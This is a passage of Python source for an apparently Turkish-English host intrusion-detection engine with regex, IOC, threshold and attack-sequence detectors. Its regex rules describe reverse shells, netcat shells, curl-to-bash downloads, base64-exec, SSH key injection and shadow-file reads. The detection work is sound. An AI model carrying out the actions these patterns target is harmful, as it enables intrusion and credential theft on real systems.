        return not any(marker in lowered for marker in mutating_markers)

    def _load_rule_tree(self, rules_dir: str) -> int:
        """Load the main rules/ tree and rules/packs/** for startup and reload."""
        loaded = self._load_yaml_rules(rules_dir)
        packs_dir = Path(rules_dir) / "packs"
        if packs_dir.exists():
            for pack_dir in sorted(packs_dir.iterdir()):
                if pack_dir.is_dir():
                    loaded += self._load_yaml_rules(str(pack_dir), pack_name=pack_dir.name)
        return loaded

    def reload(self):
        """Reload rules at runtime without requiring a restart."""
        self.rules = []
        self._yaml_ids = set()
        loaded = self._load_rule_tree(self.rules_dir)
        before = len(self.rules)
        self.rules = self._filter_by_platform(self.rules, self.distro_family)
        loaded = len(self.rules)
        filtered = before - loaded
        if filtered:
            logger.info(
                f"[AegisCore:Rule] Reload platform filtresi: {filtered} kural elendi ({self.distro_family})"
            )
        logger.info(f"[AegisCore:Rule] Reload: {loaded} kural.")
        return loaded



# ── 2. Regex Detector ─────────────────────────────────────────────────────────

REGEX_PATTERNS = [
    {
        "id": "REGEX-001",
        "name": "Reverse Shell Pattern",
        "severity": "critical",
        "score": 95,
        "pattern": re.compile(
            r'(?:bash|sh|python|perl|ruby|php)\s+(?:-i\s+)?(?:>&|>|<)\s*/dev/(?:tcp|udp)',
            re.IGNORECASE
        ),
        "message": "Reverse shell girişimi tespit edildi",
    },
    {
        "id": "REGEX-002",
        "name": "Base64 Encoded Command",
        "severity": "high",
        "score": 75,
        "pattern": re.compile(
            # Bug #14: the previous pattern was too narrow; minimum base64 blob length is 10 chars,
            # and it also catches pipe/exec variants after decoding:
            #   echo <b64> | base64 -d | python3
            #   echo <b64> | base64 --decode | sh
            #   printf <b64> | base64 -d | bash
            r'(?:echo|printf)\s+[A-Za-z0-9+/]{10,}={0,2}\s*\|'
            r'\s*base64\s+(?:-d|--decode)\s*(?:\|\s*(?:bash|sh|python\w*|perl|ruby|php|exec\b))?'
            r'|'
            r'base64\s+(?:-d|--decode)\s*<<<\s*[A-Za-z0-9+/]{10,}={0,2}',
            re.IGNORECASE
        ),
        "message": "Base64 encoded komut çalıştırma",
    },
    {
        "id": "REGEX-003",
        "name": "Wget/Curl to Pipe",
        "severity": "high",
        "score": 80,
        "pattern": re.compile(
            r'(?:wget|curl)\s+[^\|]+\|\s*(?:bash|sh|python)',
            re.IGNORECASE
        ),
        "message": "İnternetten script indirip çalıştırma",
    },
    {
        "id": "REGEX-004",
        "name": "SUID Binary Creation",
        "severity": "critical",
        "score": 90,
        "pattern": re.compile(r'chmod\s+[0-9]*[46][0-9][0-9]\s+'),
        "message": "SUID/SGID bit ayarlama",
    },
    {
        "id": "REGEX-005",
        "name": "SSH Key Injection",
        "severity": "high",
        "score": 85,
        "pattern": re.compile(
            r'(?:>>|>)\s*(?:/root|/home/\S+)/\.ssh/authorized_keys',
            re.IGNORECASE
        ),
        "message": "SSH authorized_keys dosyasına yazma",
    },
    {
        "id": "REGEX-006",
        "name": "Passwd Access",
        "severity": "medium",
        "score": 55,
        "pattern": re.compile(
            r'(?:cat|more|less|head|tail)\s+/etc/passwd',
            re.IGNORECASE
        ),
        "message": "/etc/passwd okunuyor",
    },
    {
        "id": "REGEX-006A",
        "name": "Shadow Access",
        "severity": "high",
        "score": 85,
        "pattern": re.compile(
            r'(?:cat|more|less|head|tail)\s+/etc/shadow',
            re.IGNORECASE
        ),
        "message": "/etc/shadow okunuyor",
    },
    {
        "id": "REGEX-007",
        "name": "Crontab Modification",
        "severity": "high",
        "score": 70,
        "pattern": re.compile(
            r'(?:crontab\s+-[ei]|>\s*/etc/cron)',
            re.IGNORECASE
        ),
        "message": "Crontab değiştirme girişimi",
    },
    {
        "id": "REGEX-008",
        "name": "Netcat Listener",
        "severity": "critical",
        "score": 90,
        "pattern": re.compile(r'nc\s+(?:-[lnvup]+\s+)*-l', re.IGNORECASE),
        "message": "Netcat listener başlatıldı",
    },
    {
        "id": "REGEX-009",
        "name": "Netcat Reverse Shell Command",
        "severity": "critical",
        "score": 95,
        "pattern": re.compile(
            r'(?:nc|netcat|ncat)\s+.*(?:-(?:e|c)\s*(?:/bin/)?(?:bash|sh|dash)|-(?:e|c)\s+/bin)',
            re.IGNORECASE
        ),
        "message": "Netcat ile reverse shell komutu tespit edildi",
    },
    {
        "id": "REGEX-010",
        "name": "Suspicious SSH Tunnel Command",
        "severity": "high",
        "score": 82,
        "pattern": re.compile(
            r'ssh\s+.*(?:\s-D\s+\d+|\s-R\s+(?:0\.0\.0\.0:)?\d+:\S+|\s-L\s+0\.0\.0\.0:\d+:\S+|GatewayPorts=yes|UserKnownHostsFile=/dev/null|StrictHostKeyChecking=no)',
            re.IGNORECASE
        ),
        "message": "Şüpheli SSH tunnel veya port-forward komutu tespit edildi",
    },
    {
        "id": "REGEX-011",
        "name": "Downloader Inline Fetch Execute",
        "severity": "critical",
        "score": 90,
        "pattern": re.compile(
            r'(?:curl|wget)\s+[^\n|;]*\|\s*(?:bash|sh|dash|python[23]?|perl|ruby|php)\b'
            r'|'
            r'bash\s+-c\s+["\x27]?\$\((?:curl|wget)\s+'
            r'|'
            r'wget\s+(?:-[qO]-|-O-)\s+[^\n|;]*\|\s*(?:bash|sh|dash)\b',
            re.IGNORECASE
        ),
        "message": "Downloader ile inline fetch ve execute komutu tespit edildi",
    },
]

REGEX_PATTERNS = _enrich_internal_rule_collection(REGEX_PATTERNS)


class RegexDetector:
    def __init__(self, rules_dir: str = "rules"):
        self.patterns = self._load_yaml_patterns(rules_dir)
        logger.info(f"[AegisCore:Regex] {len(self.patterns)} pattern yüklendi.")

    def _load_yaml_patterns(self, rules_dir: str) -> list:
        """Load pattern rules from rules/regex.yml; fall back to the hardcoded list if missing."""
        try:
            import yaml as _yaml
            regex_file = Path(rules_dir) / "regex.yml"
            if not regex_file.exists():
                logger.warning("[AegisCore:Regex] regex.yml bulunamadı, hardcoded patterns kullanılıyor.")
                return list(REGEX_PATTERNS)
            raw = _yaml.safe_load(regex_file.read_text())
            if not raw or not isinstance(raw, list):
                return list(REGEX_PATTERNS)
            loaded = []
            yaml_ids: set = set()
            for r in raw:
                if not isinstance(r, dict):
                    continue
                rid = r.get("id", "?")
                pat_str = r.get("pattern", "")
                if not pat_str:
                    logger.warning(f"[AegisCore:Regex] {rid}: pattern alanı boş — atlandı")
                    continue
                if rid in yaml_ids:
                    logger.warning(f"[AegisCore:Regex] Duplicate regex ID: {rid} — atlandı")
                    continue
                yaml_ids.add(rid)
                try:
                    compiled = re.compile(pat_str, re.IGNORECASE)
                except re.error as e:
                    logger.error(f"[AegisCore:Regex] {rid}: geçersiz regex pattern: {e}")
                    continue
                loaded.append({
                    "id":       rid,
                    "name":     r.get("name", rid),
                    "severity": r.get("severity", "medium"),
                    "score":    r.get("score", 50),
                    "pattern":  compiled,
                    "message":  r.get("message", f"{rid} eşleşmesi"),
                    "tags":     r.get("tags", []),
                    "mitre_tactic":    r.get("mitre_tactic", ""),
                    "mitre_technique": r.get("mitre_technique", ""),
                })
            # Also add rules from REGEX_PATTERNS that are not present in regex.yml for backward compatibility
            yaml_ids_loaded = {p["id"] for p in loaded}
            for p in REGEX_PATTERNS:
                if p["id"] not in yaml_ids_loaded:
                    loaded.append(p)
            logger.info(f"[AegisCore:Regex] regex.yml'den {len(yaml_ids)} kural, hardcoded'dan {len(REGEX_PATTERNS)-len(yaml_ids_loaded.intersection(p['id'] for p in REGEX_PATTERNS))} ek kural.")
            return loaded
        except Exception as e:
            logger.error(f"[AegisCore:Regex] regex.yml yüklenemedi: {e} — hardcoded patterns kullanılıyor.")
            return list(REGEX_PATTERNS)

    def check(self, event: NormalizedEvent) -> List[DetectionResult]:
        results = []
        # Hem message hem de sudo_command'e bak
        texts = [event.message, event.fields.get("sudo_command", ""),
                 event.fields.get("cron_command", "")]
        combined = " ".join(t for t in texts if t)

        for p in self.patterns:
            if p["pattern"].search(combined):
                results.append(DetectionResult(
                    triggered=True,
                    rule_id=p["id"],
                    severity=p["severity"],
                    score=p["score"],
                    category="process",
                    message=p["message"],
                    details={"pattern_name": p["name"]}
                ))
        return results


# ── 3. IOC Matcher ────────────────────────────────────────────────────────────

class IOCMatcher:
    def __init__(self, ioc_file: str = "config/ioc_list.txt"):
        self.ioc_ips:     set = set()
        self.ioc_domains: set = set()
        self.ioc_hashes:  set = set()
        self._load(ioc_file)

    def _load(self, path: str):
        p = Path(path)
        if not p.exists():
            logger.warning(f"[IOC] Dosya bulunamadı: {path}")
            return
        count = 0
        with open(p) as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith("#"):
                    continue
                if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', line):
                    self.ioc_ips.add(line)
                elif re.match(r'^[a-fA-F0-9]{32,64}$', line):
                    self.ioc_hashes.add(line.lower())
                else:
                    self.ioc_domains.add(line.lower())
                count += 1
        logger.info(f"[IOC] {count} IOC yüklendi "
                    f"(IP:{len(self.ioc_ips)}, domain:{len(self.ioc_domains)}, hash:{len(self.ioc_hashes)})")

    def check(self, event: NormalizedEvent) -> List[DetectionResult]:
        results = []
        # IP check
        ip_candidates = [
            ("src_ip", event.src_ip),
            ("dst_ip", event.dst_ip),
        ]
        if any(ip for _, ip in ip_candidates):
            logger.debug(
                "[IOC] IP check src_ip=%s dst_ip=%s",
                event.src_ip or "-",
                event.dst_ip or "-",
            )
        else:
            logger.debug("[IOC] IP check skipped: src_ip/dst_ip yok")
        for matched_field, ip in ip_candidates:
            if ip and ip in self.ioc_ips:
                logger.debug("[IOC] Match rule=IOC-IP field=%s value=%s", matched_field, ip)
                results.append(DetectionResult(
                    triggered=True,
                    rule_id="IOC-IP",
                    severity="critical",
                    score=100,
                    category="threat_intel",
                    message=f"Bilinen kötü IP tespit edildi: {ip}",
                    details={
                        "matched_ioc": ip,
                        "ioc_type": "ip",
                        "matched_field": matched_field,
                        "ioc_value": ip,
                    }
                ))
        # Domain check
        for domain in [event.fields.get("domain", ""), event.fields.get("hostname", "")]:
            if domain and domain.lower() in self.ioc_domains:
                results.append(DetectionResult(
                    triggered=True,
                    rule_id="IOC-DOMAIN",
                    severity="critical",
                    score=100,
                    category="threat_intel",
                    message=f"Bilinen kötü domain tespit edildi: {domain}",
                    details={
                        "matched_ioc": domain,
                        "ioc_type": "domain",
                        "matched_field": "domain",
                        "ioc_value": domain,
                    }
                ))
        # Hash check — inspect exe_hash, file_hash, and sha256 fields
        if self.ioc_hashes:
            for hash_field in ("exe_hash", "file_hash", "sha256", "md5", "sha1"):
                h = event.fields.get(hash_field, "")
                if h and h.lower() in self.ioc_hashes:
                    logger.debug("[IOC] Match rule=IOC-HASH field=%s value=%s", hash_field, h)
                    results.append(DetectionResult(
                        triggered=True,
                        rule_id="IOC-HASH",
                        severity="critical",
                        score=100,
                        category="threat_intel",
                        message=f"Bilinen kötü process/dosya hash tespit edildi: {h[:16]}…",
                        details={
                            "matched_ioc": h,
                            "ioc_type": "hash",
                            "matched_field": hash_field,
                            "ioc_value": h,
                            "hash_field": hash_field,
                        }
                    ))
                    break  # Aynı event için tek hash alarmı yeterli
        return results

    def reload(self, ioc_file: str):
        self.ioc_ips.clear()
        self.ioc_domains.clear()
        self.ioc_hashes.clear()
        self._load(ioc_file)


# ── 4. Threshold Detector ─────────────────────────────────────────────────────

class ThresholdDetector:
    """
    Sliding window icinde event sayisini izler.
    Kurallar rules/threshold.yml'den yuklenir.
    window_seconds alani zorunlu — window yazilmissa uyari verilir.

    YAML kural formati:
      - id: THR-001
        type: count
        event_match:
          action: ssh_login
          outcome: failure
        group_by: src_ip
        window_seconds: 60
        threshold: 5
        severity: high
        score: 80
        message: 'SSH Brute Force: {count} giris ({window} sn)'
    """

    def __init__(self, config: Dict = None):
        cfg = config or {}
        self._rules = []
        self._field_matcher = SemanticFieldMatcher()
        self._windows: Dict[str, collections.deque] = collections.defaultdict(
            lambda: collections.deque(maxlen=10000)
        )
        # Bug #11: last-alert timestamp for cooldown tracking
        self._cooldowns: Dict[str, float] = {}
        self._load_yaml_thresholds(cfg)

    def _load_yaml_thresholds(self, cfg: Dict):
        """rules/threshold.yml'den threshold kurallarini yukle."""
        import yaml as _yaml
        from pathlib import Path

        rules_dir = cfg.get("rules_dir", "rules")
        thr_file  = Path(rules_dir) / "threshold.yml"

        if not thr_file.exists():
            logger.warning(f"[THR] {thr_file} bulunamadi, varsayilan kurallar kullaniliyor")
            self._load_defaults(cfg)
            return

        try:
            raw = _yaml.safe_load(thr_file.read_text())
        except Exception as e:
            logger.error(f"[THR] threshold.yml parse hatasi: {e}")
            self._load_defaults(cfg)
            return

        if not raw:
            self._load_defaults(cfg)
            return

        loaded = 0
        errors = []
        for r in raw:
            rule_id = r.get("id", "?")
            try:
                # window_seconds zorunlu — window varsa migrate et
                if "window_seconds" not in r:
                    if "window" in r:
                        logger.warning(
                            f"[THR] {rule_id}: 'window' yerine 'window_seconds' kullanin"
                        )
                        r["window_seconds"] = r["window"]
                    else:
                        errors.append(f"{rule_id}: window_seconds zorunlu")
                        continue

                # threshold zorunlu
                if "threshold" not in r:
                    errors.append(f"{rule_id}: threshold zorunlu")
                    continue

                # score 0-100 arasi olmali
                score = r.get("score", 50)
                if not (0 <= score <= 100):
                    errors.append(f"{rule_id}: score 0-100 arasi olmali (mevcut: {score})")
                    continue

                # tags liste olmali
                tags = r.get("tags", [])
                if not isinstance(tags, list):
                    errors.append(f"{rule_id}: tags liste olmali")
                    continue

                # event_match ve group_by zorunlu
                event_match = r.get("event_match", {})
                group_by    = r.get("group_by", "src_ip")

                # Bug #4: rule_key must include the rule ID so different rules
                # do not collide when they share the same action:outcome:group_by combination
                # and write into one deque. Each rule must stay separated by its own ID.
                action  = event_match.get("action", "*")
                outcome = event_match.get("outcome", "*")
                rule_key = f"{rule_id}:{action}:{outcome}:{group_by}"

                window_sec = int(r["window_seconds"])
                threshold  = int(r["threshold"])
                severity   = r.get("severity", "medium")
                message    = r.get("message", f"{rule_id}: {{count}} event ({{window}} sn)")
                cooldown   = int(r.get("cooldown", 300))
                mitre_tactic    = r.get("mitre_tactic", "")
                mitre_technique = r.get("mitre_technique", "")

                # Bug #10: preserve extra filters inside event_match (user, category,
                # source, fields); _make_key only uses group_by and
                # action/outcome, so extra filters must still be checked inside check()
                # uygulanacak
                extra_filters = {
                    k: v for k, v in event_match.items()
                    if k not in ("action", "outcome")
                }
                distinct_by = r.get("distinct_by", "")

                self._rules.append({
                    "rule_id":        rule_id,
                    "rule_key":       rule_key,
                    "event_match":    event_match,
                    "extra_filters":  extra_filters,
                    "distinct_by":    distinct_by,
                    "group_by":       group_by,
                    "window":         window_sec,
                    "threshold":      threshold,
                    "severity":       severity,
                    "score":          score,
                    "message":        message,
                    "cooldown":       cooldown,
                    "mitre_tactic":   mitre_tactic,
                    "mitre_technique":mitre_technique,
                    "tags":           tags,
                })
                loaded += 1

            except Exception as e:
                errors.append(f"{rule_id}: {e}")

        if errors:
            for err in errors:
                logger.error(f"[THR] Kural hatasi: {err}")

        logger.info(f"[THR] {loaded} threshold kurali yuklendi (threshold.yml)")

    def _load_defaults(self, cfg: Dict):
        """YAML yoksa hardcoded varsayilan kurallar."""
        defaults = [
            # Bug #4: rule_key now includes the rule_id prefix
            ("THR-001", "THR-001:ssh_login:failure:src_ip",
             cfg.get("failed_login_window", 60),
             cfg.get("failed_login_count", 5),
             "high", 80,
             "SSH Brute Force: {count} basarisiz giris ({window} sn)", 300),
            ("THR-002", "THR-002:sudo:failure:user",
             cfg.get("sudo_fail_window", 120),
             cfg.get("sudo_fail_count", 3),
             "high", 75,
             "Sudo Brute Force: {count} basarisiz deneme", 300),
            ("THR-003", "THR-003:ssh_login:*:src_ip",
             cfg.get("ssh_connection_window", 60),
             cfg.get("ssh_connection_count", 20),
             "medium", 60,
             "SSH baglanti firtinasi: {count} baglanti ({window} sn)", 120),
        ]
        for rule_id, rule_key, window, threshold, severity, score, msg, cooldown in defaults:
            self._rules.append({
                "rule_id": rule_id, "rule_key": rule_key,
                "event_match": {}, "extra_filters": {}, "group_by": rule_key.rsplit(":", 1)[-1],
                "window": window, "threshold": threshold,
                "severity": severity, "score": score,
                "message": msg, "cooldown": cooldown,
                "mitre_tactic": "", "mitre_technique": "", "tags": [],
            })
        logger.info(f"[THR] {len(defaults)} varsayilan threshold kurali yuklendi")

    def _make_key(self, rule: Dict, event: NormalizedEvent) -> Optional[str]:
        """
        Her kural için benzersiz pencere anahtarı üret.
        Bug #4: rule_key artık rule_id içeriyor — farklı kurallar ayrı deque kullanır.
        Bug #10: event_match içindeki ek filtreler (user, category, source, fields)
                 burada kontrol edilir.
        """
        rule_key    = rule["rule_key"]
        event_match = rule.get("event_match", {})
        group_by    = rule.get("group_by", "src_ip")

        # Temel action/outcome filtresi
        action_filter  = event_match.get("action", "*")
        outcome_filter = event_match.get("outcome", "*")
        distro_family = getattr(event, "distro_family", "")
        rhel_invalid_ssh = (
            distro_family == "rhel"
            and event.action == "ssh_login"
            and event.outcome == "failure"
            and isinstance(event.fields, dict)
            and event.fields.get("invalid_user") is True
        )
        rhel_invalid_as_enumeration = (
            rhel_invalid_ssh
            and rule.get("rule_id") == "THR-004"
            and action_filter == "ssh_invalid_user"
        )

        if action_filter != "*":
            if isinstance(action_filter, list):
                if event.action not in action_filter:
                    return None
            elif event.action != action_filter:
                if not rhel_invalid_as_enumeration:
                    return None
        if outcome_filter != "*":
            if isinstance(outcome_filter, list):
                if event.outcome not in outcome_filter:
                    return None
            elif event.outcome != outcome_filter:
                return None

        # Bug #10: ek filtreler — user, category, source
        extra = rule.get("extra_filters", {})
        if "user" in extra and event.user != extra["user"]:
            return None
        if "category" in extra and event.category != extra["category"]:
            return None
        if "source" in extra:
            src_val = extra["source"]
            if isinstance(src_val, list):
                if event.source not in src_val:
                    return None
            elif event.source != src_val:
                return None

        # Bug #10: fields ek filtresi
        if "fields" in extra:
            if (
                not (
                    distro_family == "rhel"
                    and rule.get("rule_id") == "THR-001"
                    and isinstance(event.fields, dict)
                    and event.fields.get("invalid_user") is True
                )
                and not self._field_matcher.match_fields(event.fields, extra["fields"])
            ):
                return None

        # group_by entity value
        entity_val = getattr(event, group_by, "") or self._field_matcher.semantic_value(event.fields, group_by)
        if (
            not entity_val
            and rule.get("rule_id") == "THR-008"
            and event.action == "db_login"
            and event.outcome == "failure"
            and group_by == "src_ip"
        ):
            entity_val = event.user or self._field_matcher.semantic_value(event.fields, "user")
        if not entity_val:
            return None

        return f"{rule_key}|{entity_val}"

    def check(self, event: NormalizedEvent) -> List[DetectionResult]:
        results = []
        now = event.ts or time.time()

        for rule in self._rules:
            rule_id  = rule["rule_id"]
            window   = rule["window"]
            cooldown = rule.get("cooldown", 300)
            key      = self._make_key(rule, event)
            if key is None:
                continue

            dq = self._windows[key]
            distinct_by = rule.get("distinct_by", "")
            if distinct_by:
                distinct_val = (
                    getattr(event, distinct_by, "")
                    or self._field_matcher.semantic_value(event.fields, distinct_by)
                )
                if not distinct_val:
                    continue
                dq.append((now, str(distinct_val)))
            else:
                dq.append(now)

            cutoff = now - window
            if distinct_by:
                while dq and dq[0][0] < cutoff:
                    dq.popleft()
                count = len({value for _, value in dq})
            else:
                while dq and dq[0] < cutoff:
                    dq.popleft()
                count = len(dq)
            if count >= rule["threshold"]:
                # Bug #11: cooldown — if the cooldown has not elapsed since the last alert
                # do not emit another alert
                cooldown_key = f"_cd:{key}"
                last_alert_ts = self._cooldowns.get(cooldown_key, 0.0)
                if now - last_alert_ts < cooldown:
                    continue
                self._cooldowns[cooldown_key] = now

                msg = rule["message"].format(count=count, window=window)
                results.append(DetectionResult(
                    triggered=True,
                    rule_id=rule_id,
                    severity=rule["severity"],
                    score=rule["score"],
                    category="threshold",
                    message=msg,
                    mitre_tactic=rule.get("mitre_tactic", ""),
                    mitre_technique=rule.get("mitre_technique", ""),
                    tags=rule.get("tags", []),
                    details={
                        "count": count, "window": window,
                        "threshold": rule["threshold"],
                        "key": key, "cooldown": cooldown,
                    }
                ))

        return results

    def cleanup(self, max_idle_seconds: float = 3600) -> int:
        """
        Uzun süredir aktif olmayan _windows ve _cooldowns girdilerini temizle.
        Maintenance thread'den periyodik olarak çağrılmalı.
        Döndürür: silinen toplam giriş sayısı.
        """
        now = time.time()
        cutoff = now - max_idle_seconds
        removed = 0

        # _windows: remove deques whose last event is far beyond the window duration
        stale_window_keys = []
        for key, dq in self._windows.items():
            if not dq:
                stale_window_keys.append(key)
                continue
            # A deque entry may contain either (ts, val) tuples or raw ts values
            last_ts = dq[-1][0] if isinstance(dq[-1], tuple) else dq[-1]
            if last_ts < cutoff:
                stale_window_keys.append(key)
        for key in stale_window_keys:
            del self._windows[key]
            removed += 1

        # _cooldowns: remove expired cooldown entries
        stale_cd_keys = [k for k, ts in self._cooldowns.items() if ts < cutoff]
        for key in stale_cd_keys:
            del self._cooldowns[key]
            removed += 1

        if removed:
            logger.debug(f"[THR] cleanup: {removed} eski giriş temizlendi")
        return removed


# ── 7. Sequence Detector ──────────────────────────────────────────────────────

class SequenceDetector:
    """
    Bilinen saldırı zincirlerini adım adım takip eder.

    State DB'ye kaydedilir — restart'ta saldırı zinciri kaybolmaz.
    db parametresi verilmezse memory-only çalışır.
    """

    SEQUENCES = [
        {
            "id":      "SEQ-001",
            "name":    "SSH Brute Force → Başarılı Giriş",
            "severity": "critical",
            "score":   95,
            "timeout": 300,
            "entity_type": "ip",
            "steps": [
                {"category": "auth", "action": "ssh_login",   "outcome": "failure"},
                {"category": "auth", "action": "ssh_login",   "outcome": "success"},
            ],
            "message": "Brute force sonrası başarılı SSH girişi",
        },
        {
            "id":      "SEQ-002",
            "name":    "Başarılı Giriş → Root Yetki Yükseltme → Tehlikeli Komut",
            "severity": "critical",
            "score":   99,
            "timeout": 600,
            "entity_type": "user",
            "steps": [
                {"action": "ssh_login", "outcome": "success"},
                {"action": "sudo",      "outcome": "success"},
                {"action": "lotl_exec"},
            ],
            "message": "Giriş → yetki yükseltme → saldırı aracı zinciri",
        },
        {
            "id":      "SEQ-003",
            "name":    "Yeni Kullanıcı → Sudo Yetki",
            "severity": "high",
            "score":   85,
            "timeout": 120,
            "entity_type": "user",
            "steps": [
                {"category": "auth", "action": "useradd"},
                {"action": "sudo", "outcome": "success"},
            ],
            "message": "Yeni kullanıcı oluşturuldu ve hemen sudo kullandı",
        },
        {
            "id":      "SEQ-004",
            "name":    "Port Tarama → SSH Brute Force",
            "severity": "high",
            "score":   80,
            "timeout": 600,
            "entity_type": "ip",
            "steps": [
                {"action": "lotl_exec", "fields": {"attack": "nmap_scan"}},
                {"category": "auth",    "action": "ssh_login", "outcome": "failure"},
            ],
            "message": "Port tarama ardından SSH brute force",
        },
        {
            "id":      "SEQ-005",
            "name":    "Güvenlik Aracı Kaldırma → Saldırı",
            "severity": "critical",
            "score":   95,
            "timeout": 300,
            "entity_type": "auto",
            "steps": [
                {"action": "security_tool_removed"},
                {"action": "lotl_exec"},
            ],
            "message": "Güvenlik aracı kaldırıldı ardından saldırı aracı çalıştırıldı",
        },

        # ── Yeni Zincirler ────────────────────────────────────────────────────

        {
            "id":      "SEQ-006",
            "name":    "Brute Force → Başarılı Giriş → Privilege Escalation",
            "severity": "critical",
            "score":   99,
            "timeout": 600,
            "entity_type": "ip",
            "steps": [
                {"action": "ssh_login",  "outcome": "failure"},
                {"action": "ssh_login",  "outcome": "success"},
                {"action": "sudo",       "outcome": "success"},
            ],
            "message": "Brute force → başarılı giriş → yetki yükseltme tam saldırı zinciri",
        },
        {
            "id":      "SEQ-007",
            "name":    "Başarılı Giriş → Yeni Kullanıcı Oluşturma → Persistence",
            "severity": "critical",
            "score":   99,
            "timeout": 600,
            "entity_type": "user",
            "steps": [
                {"action": "ssh_login", "outcome": "success"},
                {"action": "useradd"},
            ],
            "message": "SSH girişi sonrası yeni kullanıcı oluşturuldu — persistence backdoor",
        },
        {
            "id":      "SEQ-008",
            "name":    "Paket Keşfi → Saldırı Aracı Kurulumu",
            "severity": "high",
            "score":   85,
            "timeout": 300,
            "entity_type": "auto",
            "steps": [
                {"action": "sudo", "outcome": "success"},
                {"action": "attack_tool_installed"},
            ],
            "message": "sudo yetkisi alındı ardından saldırı aracı kuruldu",
        },
        {
            "id":      "SEQ-009",
            "name":    "SSH Giriş → Crontab Değiştirme",
            "severity": "critical",
            "score":   95,
            "timeout": 900,
            "entity_type": "user",
            "steps": [
                {"action": "ssh_login", "outcome": "success"},
                {"action": "cron_exec"},
            ],
            "message": "SSH girişi ardından crontab değişikliği — persistence zinciri",
        },
        {
            "id":      "SEQ-010",
            "name":    "DGA/Şüpheli DNS → Dış Bağlantı Denemesi",
            "severity": "high",
            "score":   85,
            "timeout": 120,
            "entity_type": "ip",
            "steps": [
                {"action": "dga_detected"},
                {"action": "lotl_exec"},
            ],
            "message": "DGA domain sorgusu ardından komut çalıştırıldı — C2 iletişim şüphesi",
        },
        {
            "id":      "SEQ-011",
            "name":    "Kullanıcı Silme → Log Temizleme",
            "severity": "critical",
            "score":   95,
            "timeout": 300,
            "entity_type": "user",
            "steps": [
                {"action": "userdel"},
                {"action": "sudo", "outcome": "success"},
            ],
            "message": "Kullanıcı silindi ardından sudo komutu — iz örtme girişimi",
        },
        {
            "id":      "SEQ-012",
            "name":    "Başarısız Sudo → Session Açma → Başarılı Sudo",
            "severity": "high",
            "score":   80,
            "timeout": 300,
            "entity_type": "user",
            "steps": [
                {"action": "sudo",         "outcome": "failure"},
                {"action": "session_open", "outcome": "success"},
                {"action": "sudo",         "outcome": "success"},
            ],
            "message": "Sudo başarısızlığı sonrası yeni session açıp sudo başardı — credential reuse",
        },
        {
            "id":      "SEQ-013",
            "name":    "Web Saldırısı → Shell Upload → Komut Çalıştırma",
            "severity": "critical",
            "score":   99,
            "timeout": 300,
            "entity_type": "ip",
            "steps": [
                {"action": "shell_upload"},
                {"action": "lotl_exec"},
            ],
            "message": "Web shell yüklendi ve ardından komut çalıştırıldı — tam web compromise",
        },
        {
            "id":      "SEQ-014",
            "name":    "Port Tarama → Web Saldırısı",
            "severity": "high",
            "score":   80,
            "timeout": 900,
            "entity_type": "ip",
            "steps": [
                {"action": "lotl_exec", "fields": {"attack": "nmap_scan"}},
                {"action": "sqli_attempt"},
            ],
            "message": "Port tarama ardından SQL injection — hedefli saldırı zinciri",
        },
        {
            "id":      "SEQ-015",
            "name":    "Brute Force → Başarılı Giriş → Lateral Movement",
            "severity": "critical",
            "score":   99,
            "timeout": 900,
            "entity_type": "ip",
            "steps": [
                {"action": "ssh_login",  "outcome": "failure"},
                {"action": "ssh_login",  "outcome": "success"},
                {"action": "ssh_login",  "outcome": "success"},
            ],
            "message": "Brute force → giriş → farklı hedefe SSH — lateral movement zinciri",
        },
        {
            "id":      "SEQ-016",
            "name":    "SSH Giriş → Şifre Değiştirme",
            "severity": "high",
            "score":   80,
            "timeout": 600,
            "entity_type": "user",
            "steps": [
                {"action": "ssh_login",     "outcome": "success"},
                {"action": "passwd_change"},
            ],
            "message": "SSH girişi ardından şifre değişikliği — hesap ele geçirme şüphesi",
        },
        {
            "id":      "SEQ-017",
            "name":    "Saldırı Aracı Kurulumu → LotL Exec",
            "severity": "critical",
            "score":   99,
            "timeout": 600,
            "entity_type": "auto",
            "steps": [
                {"action": "attack_tool_installed"},
                {"action": "lotl_exec"},
            ],
            "message": "Saldırı aracı kuruldu ve hemen çalıştırıldı — aktif saldırı",
        },
        {
            "id":      "SEQ-018",
            "name":    "DB Login Başarısızlığı → Başarılı DB Girişi",
            "severity": "high",
            "score":   85,
            "timeout": 120,
            "entity_type": "ip",
            "steps": [
                {"action": "db_login", "outcome": "failure"},
                {"action": "db_login", "outcome": "success"},
            ],
            "message": "Veritabanı brute force sonrası başarılı giriş — DB credential compromise",
        },
        {
            "id":      "SEQ-019",
            "name":    "Root SSH → Kernel Modülü Yükleme",
            "severity": "critical",
            "score":   99,
            "timeout": 900,
            "entity_type": "user",
            "steps": [
                {"action": "ssh_login", "outcome": "success", "category": "auth"},
                {"action": "sudo",      "outcome": "success"},
                {"action": "lotl_exec"},
            ],
            "message": "Root ile giriş → sudo → saldırı aracı — tam saldırı pipeline'ı",
        },
        {
            "id":      "SEQ-020",
            "name":    "Suspicious TLD DNS → LotL Exec",
            "severity": "high",
            "score":   85,
            "timeout": 300,
            "entity_type": "ip",
            "steps": [
                {"action": "suspicious_tld"},
                {"action": "lotl_exec"},
            ],
            "message": "Şüpheli TLD DNS sorgusu ardından komut çalıştırıldı — C2 callback şüphesi",
        },
        {
            "id":      "SEQ-021",
            "name":    "Identity Failure → Success",
            "severity": "medium",
            "score":   55,
            "timeout": 300,
            "entity_type": "user",
            "steps": [
                {"action": "identity_login", "outcome": "failure"},
                {"action": "identity_login", "outcome": "success"},
            ],
            "message": "Kimlik doğrulama başarısızlığı ardından başarılı giriş",
            "summary": "Aynı kullanıcı için identity auth başarısızlığını kısa sürede başarı izledi.",
            "operator_note": "Kaynak IP, kimlik sağlayıcı ve aradaki politika/lockout olaylarını kontrol edin.",
            "mitre_tactic": "TA0006",
            "mitre_technique": "T1110",
            "tags": ["sequence", "identity", "credential-access", "fail-success", "post-auth"],
        },
        {
            "id":      "SEQ-022",
            "name":    "Identity Failure → Account Lockout",
            "severity": "medium",
            "score":   60,
            "timeout": 300,
            "entity_type": "user",
            "steps": [
                {"action": "identity_login", "outcome": "failure"},
                {"action": "account_locked", "outcome": "failure"},
            ],
            "message": "Kimlik doğrulama başarısızlıkları ardından hesap kilitlendi",
            "summary": "Tekrarlayan identity auth başarısızlığı sonrası hesap kilitlendi.",
            "operator_note": "Kilitlenen hesabın kaynağını ve kısa süre sonraki recovery/success olaylarını izleyin.",
            "mitre_tactic": "TA0006",
            "mitre_technique": "T1110",
